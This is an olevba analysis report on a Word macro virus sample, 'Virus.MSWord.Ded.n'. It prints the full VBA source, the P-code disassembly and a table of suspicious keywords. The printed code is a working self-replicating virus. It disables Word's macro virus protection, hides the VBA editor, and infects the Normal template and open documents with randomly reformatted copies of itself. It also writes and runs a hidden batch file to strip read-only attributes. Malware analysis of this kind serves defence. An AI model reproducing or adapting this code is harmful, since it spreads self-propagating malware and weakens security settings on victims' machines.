olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ded.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ded.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
            Private Sub _
Čäĺíňčôčęŕňîđ()

       End Sub
'36,40187
              Private Sub _
Document_New()

              End Sub
'10,63697
             Private Sub Document_Close()
'45,79715
    On _
Error GoTo skam

       Options.VirusProtection = _
False

         SWL
'25,72676
     ABS99
'50,60874
skam:
'59,60946
        End Sub
'0,024122
  Private _
Sub SWL()

  Application. _
                                      ShowVisualBasicEditor = False

    If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

        For I = 1 To NormalTemplate.VBProject. _
  VBComponents(1).CodeModule.CountOfLines

      d _
= NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

            If Len(d) > _
0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

          While _
Mid(d, Len(d) - 1, 2) = " _"

    I _
= I + 1

           d = Left(d, _
Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

Wend
'95,67625
 d = _
e(d)

          ActiveDocument. _
                                                               VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

          End If
'80,25874
              Next _
I

  ActiveDocument. _
                              SaveAs AddToRecentFiles:=False

          End If
'44,11147
  End _
Sub

Private Sub ABS99()
'40,16046
      If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

f (NormalTemplate.FullName)
'34,69571
 For I = _
1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

          d _
= ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

        If Len(d) _
> 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

           While _
Mid(d, Len(d) - 1, 2) = " _"

     I _
= I + 1

  d = Left(d, Len(d) - 1) & _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

    Wend
'42,58493
  d = e(d)
'37,74076
   NormalTemplate. _
   VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

       End _
If

             Next I
'96,26782
        NormalTemplate. _
                                      Save

            End If
'40,10364
              End _
Sub

         Private Function _
e(aString) As String

        aString = LTrim(aString)
'54,84239
    aString _
= RTrim(aString)

      If _
aString = "Sub " & "Vc()" Then

      aString = "Sub " & "ViewVBCode()"
'73,35107
           Else
'57,29536
  If aString = "Sub " & "ViewVBCode()" Then
'42,49291
         aString = "Sub " & "Vc()"
'28,35842
 End If
'30,00323
    End If
'13,56363
  For I _
= 1 To Len(aString) - 1

        If _
Mid(aString, I, 1) = "." Then

        If Not _
Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

              If _
Not Mid(aString, I + 1, 1) = Chr$(34) Then

      e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

  For _
j = 1 To Int(15 * Rnd)

 e _
= " " & e

          Next _
j

           Exit _
Function

             End _
If

   End _
If

 Else
'62,66841
         If Mid(aString, I, 1) = " " And Int(3 * _
Rnd) = 1 And I > 1 Then

      If Not Mid(aString, _
I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

         e _
= Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

For _
j = 1 To Int(15 * Rnd)

    e _
= " " & e

Next _
j

    Exit _
Function

        End If
'57,53485
         End If
'40,76948
          End If
'58,95553
 Next _
I

e _
= aString & Chr$(13) & "'" & (100 * Rnd)

    Count _
= Int(15 * Rnd)

      For _
j = 1 To Count

     e = " " & _
e

Next _
j

       End Function
'98,3534
        Private Sub _
f(fName)

              If GetAttr(fName) And vbReadOnly Then
'54,56762
           Open Dir(fName) & ".bat" For _
Append As #1

     Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

   Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)
'98,79494
        Close _
#1

        shellResult = _
Shell(Dir(fName) & ".bat", vbHide)

    End If
'15,13002
           End Sub
'5,261064
         Private _
Sub Document_Open()

     End _
Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Ded.n
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9428 bytes
' Line #0:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub Čäĺíňčôčęŕňîđ())
' Line #1:
' Line #2:
' 	EndSub 
' Line #3:
' 	QuoteRem 0x0000 0x0008 "36,40187"
' Line #4:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub Document_New())
' Line #5:
' Line #6:
' 	EndSub 
' Line #7:
' 	QuoteRem 0x0000 0x0008 "10,63697"
' Line #8:
' 	FuncDefn (Private Sub Document_Close())
' Line #9:
' 	QuoteRem 0x0000 0x0008 "45,79715"
' Line #10:
' 	LineCont 0x0004 01 00 00 00
' 	OnError skam 
' Line #11:
' Line #12:
' 	LineCont 0x0004 04 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' Line #14:
' 	ArgsCall SWL 0x0000 
' Line #15:
' 	QuoteRem 0x0000 0x0008 "25,72676"
' Line #16:
' 	ArgsCall ABS99 0x0000 
' Line #17:
' 	QuoteRem 0x0000 0x0008 "50,60874"
' Line #18:
' 	Label skam 
' Line #19:
' 	QuoteRem 0x0000 0x0008 "59,60946"
' Line #20:
' 	EndSub 
' Line #21:
' 	QuoteRem 0x0000 0x0008 "0,024122"
' Line #22:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub SWL())
' Line #23:
' Line #24:
' 	LineCont 0x0004 02 00 26 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #25:
' Line #26:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #27:
' Line #28:
' 	LineCont 0x0004 09 00 02 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #29:
' Line #30:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #31:
' Line #32:
' 	LineCont 0x0004 06 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #33:
' Line #34:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #35:
' Line #36:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #37:
' Line #38:
' 	LineCont 0x0004 06 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #39:
' Line #40:
' 	Wend 
' Line #41:
' 	QuoteRem 0x0000 0x0008 "95,67625"
' Line #42:
' 	LineCont 0x0004 02 00 00 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #43:
' Line #44:
' 	LineCont 0x0004 02 00 3F 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #45:
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	QuoteRem 0x0000 0x0008 "80,25874"
' Line #48:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' Line #50:
' 	LineCont 0x0004 02 00 1E 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #51:
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	QuoteRem 0x0000 0x0008 "44,11147"
' Line #54:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #55:
' Line #56:
' 	FuncDefn (Private Sub ABS99())
' Line #57:
' 	QuoteRem 0x0000 0x0008 "40,16046"
' Line #58:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #59:
' Line #60:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall False 0x0001 
' Line #61:
' 	QuoteRem 0x0000 0x0008 "34,69571"
' Line #62:
' 	LineCont 0x0004 03 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #63:
' Line #64:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #65:
' Line #66:
' 	LineCont 0x0004 05 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #67:
' Line #68:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #69:
' Line #70:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #71:
' Line #72:
' 	LineCont 0x0004 0E 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #73:
' Line #74:
' 	Wend 
' Line #75:
' 	QuoteRem 0x0000 0x0008 "42,58493"
' Line #76:
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #77:
' 	QuoteRem 0x0000 0x0008 "37,74076"
' Line #78:
' 	LineCont 0x0004 02 00 03 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' Line #80:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #81:
' Line #82:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	QuoteRem 0x0000 0x0008 "96,26782"
' Line #84:
' 	LineCont 0x0004 02 00 26 00
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #85:
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	QuoteRem 0x0000 0x0008 "40,10364"
' Line #88:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #89:
' Line #90:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Function e(aString, id_FFFE As String) As String)
' Line #91:
' Line #92:
' 	Ld aString 
' 	ArgsLd LTrim 0x0001 
' 	St aString 
' Line #93:
' 	QuoteRem 0x0000 0x0008 "54,84239"
' Line #94:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	ArgsLd RTrim 0x0001 
' 	St aString 
' Line #95:
' Line #96:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #97:
' Line #98:
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	St aString 
' Line #99:
' 	QuoteRem 0x0000 0x0008 "73,35107"
' Line #100:
' 	ElseBlock 
' Line #101:
' 	QuoteRem 0x0000 0x0008 "57,29536"
' Line #102:
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #103:
' 	QuoteRem 0x0000 0x0008 "42,49291"
' Line #104:
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	St aString 
' Line #105:
' 	QuoteRem 0x0000 0x0008 "28,35842"
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	QuoteRem 0x0000 0x0008 "30,00323"
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	QuoteRem 0x0000 0x0008 "13,56363"
' Line #110:
' 	LineCont 0x0004 02 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #111:
' Line #112:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	IfBlock 
' Line #113:
' Line #114:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #115:
' Line #116:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #117:
' Line #118:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ". _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #119:
' Line #120:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #121:
' Line #122:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #123:
' Line #124:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #125:
' Line #126:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFunc 
' Line #127:
' Line #128:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #129:
' Line #130:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #131:
' Line #132:
' 	ElseBlock 
' Line #133:
' 	QuoteRem 0x0000 0x0008 "62,66841"
' Line #134:
' 	LineCont 0x0004 10 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #135:
' Line #136:
' 	LineCont 0x0004 06 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #137:
' Line #138:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 " _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #139:
' Line #140:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #141:
' Line #142:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #143:
' Line #144:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #145:
' Line #146:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFunc 
' Line #147:
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	QuoteRem 0x0000 0x0008 "57,53485"
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	QuoteRem 0x0000 0x0008 "40,76948"
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	QuoteRem 0x0000 0x0008 "58,95553"
' Line #154:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #155:
' Line #156:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Concat 
' 	St e 
' Line #157:
' Line #158:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Count 
' Line #159:
' Line #160:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #161:
' Line #162:
' 	LineCont 0x0004 04 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #163:
' Line #164:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #165:
' Line #166:
' 	EndFunc 
' Line #167:
' 	QuoteRem 0x0000 0x0007 "98,3534"
' Line #168:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub False(fName))
' Line #169:
' Line #170:
' 	Ld fName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	IfBlock 
' Line #171:
' 	QuoteRem 0x0000 0x0008 "54,56762"
' Line #172:
' 	LineCont 0x0004 08 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #173:
' Line #174:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Attrib "
' 	LitStr 0x0003 "-r "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #175:
' Line #176:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #177:
' 	QuoteRem 0x0000 0x0008 "98,79494"
' Line #178:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #179:
' Line #180:
' 	LineCont 0x0004 02 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St shellResult 
' Line #181:
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	QuoteRem 0x0000 0x0008 "15,13002"
' Line #184:
' 	EndSub 
' Line #185:
' 	QuoteRem 0x0000 0x0008 "5,261064"
' Line #186:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub Document_Open())
' Line #187:
' Line #188:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #189:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

